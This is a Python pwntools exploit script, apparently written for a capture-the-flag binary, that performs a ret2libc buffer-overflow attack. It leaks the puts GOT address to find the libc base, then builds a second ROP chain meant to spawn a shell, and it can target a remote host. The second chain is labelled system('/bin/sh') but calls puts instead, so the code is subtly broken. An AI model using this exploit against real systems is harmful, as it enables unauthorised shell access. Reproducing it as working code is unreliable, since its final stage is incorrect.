from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './idk.bin'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local

# Offset to RIP, found manually with GDB
offset = 104

# Start program
io = start()

pop_rdi = 0x4014c3
ls = 0x4040a0
# libc.address = 0x52454b3bc928

# Payload to leak libc function
payload = flat({
    offset: [
        pop_rdi,  # Pop got.puts into RDI
        elf.got.puts,
        elf.plt.puts,  # Call puts() to leak the got.puts address
        elf.symbols.main  # Return to vuln (to overflow buffer with another payload)
    ]
})

# Send the payload
io.sendlineafter(b': ', payload)

# print(io.recvline())# Blank line

# Retrieve got.puts address
io.recvline()
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)


# Payload to get shell: system('/bin/sh')
payload = flat({
    offset: [
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        elf.plt.puts
    ]
})

# Send the payload
io.sendline(payload)

# Got Shell?